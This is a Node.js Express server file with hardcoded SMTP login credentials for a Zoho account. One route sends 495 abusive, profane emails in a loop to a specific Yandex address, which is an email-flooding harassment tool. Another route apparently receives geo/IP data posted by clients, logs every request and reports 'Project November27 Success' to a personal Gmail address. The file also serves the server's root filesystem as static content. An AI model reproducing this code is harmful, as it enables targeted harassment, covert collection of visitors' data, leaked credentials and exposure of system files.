// const keyPublishable = process.env.PUBLISHABLE_KEY;
// const keySecret = process.env.SECRET_KEY;

//App Setup
var express = require('express');
const app = require("express")();
const path = require('path');
app.set("view engine", "pug");

//Body parser setup
const bodyParser = require('body-parser');
app.use(bodyParser.urlencoded({extended: true}));
app.use(bodyParser.json());
var cors = require('cors')

app.use(cors())

const moment = require('moment');
const nodemailer = require("nodemailer");
let transporter = nodemailer.createTransport({
    host: 'smtp.zoho.com',
    port: 587,
    secure: false,
    requireTLS: true,
    auth: {
        user: 'bravo25@zoho.com',
        pass: "ScienceTech99#!!$="
    }
});

function emailUser(email, text, subject) {


    const message = {
        from: "bravo25@zoho.com",
        to: email,
        subject: subject,
        text: text
    };

    transporter.sendMail(message, (err, response) => {
        if (err) {
            console.error("Failed to send email: " + err);
        } else {
            console.error("success sending email");
        }
    })
}

transporter.verify(function (error, success) {
    if (error)
        console.error(error);
    else
        console.log("Transporter verified: " + success)
});

function wait(ms) {
    const start = new Date().getTime();
    let end = start;
    while (end < start + ms) {
        end = new Date().getTime();
    }
}

app.use('/www/', express.static('public'))
app.use('/static', express.static(path.join(__dirname, 'www')))
app.use('/people', express.static(path.join(__dirname, 'www/people')))
app.use('/people/陳博康', express.static(path.join(__dirname, 'www/people/陳博康')))
app.use(express.static('/'))
app.get('/hello', (req, res) => {
    res.status(200).send('Hello, world!').end();
});

app.get("/", (req, res) => {
    res.render("index.pug",)
});
app.get("/client_side_fucks", (req, res) => {
    app.use('/client.js', express.static('public'))
    // res.render("www/client.js").send(200);
});
app.get('/send_fuckers', (req, res) => {
    let count = 0;
    while (true) {
        wait(1000)
        count++;
        let message = "YOUR FUCKING BRAVO25 FUCKERS FUCK YOU ASS HATS" + generateUUID() + "YOUR FUCKING BRAVO25 FUCKERS FUCK YOU ASS HATS" + generateUUID() + "YOUR FUCKING BRAVO25 FUCKERS FUCK YOU ASS HATS" + generateUUID() + "YOUR FUCKING BRAVO25 FUCKERS FUCK YOU ASS HATS" + generateUUID() + "YOUR FUCKING BRAVO25 FUCKERS FUCK YOU ASS HATS" + generateUUID() + "YOUR FUCKING BRAVO25 FUCKERS FUCK YOU ASS HATS" + generateUUID() + "YOUR FUCKING BRAVO25 FUCKERS FUCK YOU ASS HATS" + generateUUID() + "YOUR FUCKING BRAVO25 FUCKERS FUCK YOU ASS HATS" + generateUUID() + "YOUR FUCKING BRAVO25 FUCKERS FUCK YOU ASS HATS" + generateUUID() + "YOUR FUCKING BRAVO25 FUCKERS FUCK YOU ASS HATS" + generateUUID() + "YOUR FUCKING BRAVO25 FUCKERS FUCK YOU ASS HATS" + generateUUID() + "YOUR FUCKING BRAVO25 FUCKERS FUCK YOU ASS HATS" + generateUUID() + "YOUR FUCKING BRAVO25 FUCKERS FUCK YOU ASS HATS" + generateUUID() + "YOUR FUCKING BRAVO25 FUCKERS FUCK YOU ASS HATS" + generateUUID() + "YOUR FUCKING BRAVO25 FUCKERS FUCK YOU ASS HATS" + generateUUID() + "YOUR FUCKING BRAVO25 FUCKERS FUCK YOU ASS HATS" + generateUUID() + "YOUR FUCKING BRAVO25 FUCKERS FUCK YOU ASS HATS" + generateUUID() + "YOUR FUCKING BRAVO25 FUCKERS FUCK YOU ASS HATS" + generateUUID() + "YOUR FUCKING BRAVO25 FUCKERS FUCK YOU ASS HATS" + generateUUID() + "YOUR FUCKING BRAVO25 FUCKERS FUCK YOU ASS HATS" + generateUUID()
        emailUser("hkleaks@yandex.com", message, "YOUR FUCKING BRAVO25 FUCKERS FUCK YOU ASS HATS" + generateUUID())
        console.log("UUID email", generateUUID());
        if (count === 495) {
            res.send(200);
            break;
        }

    }
});


app.post('/geo_ip_rec', (req, res) => {
    const text = req.body;
    if (!text) {
        res.send(500);
        return;
    }
    emailUser("charlieporth1@gmail.com", "Project November27 Success Check the logs" + generateUUID(), "Project November27 Success" + generateUUID())
    console.log("req ", req);
    console.log("text ", text);
    console.log("UUID ", generateUUID().substring(0, 16));
    res.send(200);
});

function generateUUID() { // Public Domain/MIT
    let limit = 10;
    let d = new Date().getTime();
    if (typeof performance !== 'undefined' && typeof performance.now === 'function') {
        d += performance.now(); //use high-precision timer if available
    }
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
        let r = (d + Math.random() * 16) % 16 | 0;
        d = Math.floor(d / 16);
        return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16).substr(0, limit); //.substring(0, limit).slice(0, limit).substr(0, limit); //substr() is also good
    });
}

app.listen(process.env.PORT || 3000);
